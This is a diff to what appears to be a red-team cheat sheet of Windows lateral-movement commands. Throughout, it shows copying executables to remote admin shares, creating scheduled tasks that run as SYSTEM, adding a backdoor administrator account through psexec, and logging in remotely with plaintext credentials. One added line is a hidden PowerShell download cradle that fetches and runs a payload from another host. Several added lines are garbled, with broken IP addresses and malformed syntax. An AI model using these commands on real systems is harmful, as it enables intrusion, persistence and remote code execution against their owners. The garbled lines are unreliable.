@@ -24,6 +24,7 @@ shell copy Service.exe \\wkstn-4945\c$\Temp\foobar.exe
 
 
 shell schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S host /RU System
+shell schtasks /create /s 192.168.99.137 /u Operator /p "123456" /sc MINUTE /mo 1 /tn test /tr "C:\Users\Public\\cmd.exe"
 shell schtasks /run /tn foobar /S host
 shell schtasks /F /delete /tn foobar /S host
 
@@ -54,6 +55,8 @@ remote-exec winrm 192.168.100.100 whoami; hostname
 ```
 remote-exec psexec wkstn-4945 cmd.exe /c "net user rastamouse Passw0rd! /add && net localgroup administrators MeMe /add"
 remote-exec winrm wkstn-4945 net localgroup administrators
+shell psexec.exe \\ 192.168 . 200.66 -u Administrator -p Hacker @ 1 . whoami
+psexec.exe the shell 192.168 . 200.66 -u Administrator -p @ Hacker . 1 PowerShell.exe -nop -w hidden -C IEX ((. new new - Object net.webclient) .downloadstring ( ' HTTP: //192.168. 200.222:8080/payload.txt ' ))
 ```
 
 ### Remote File Upload
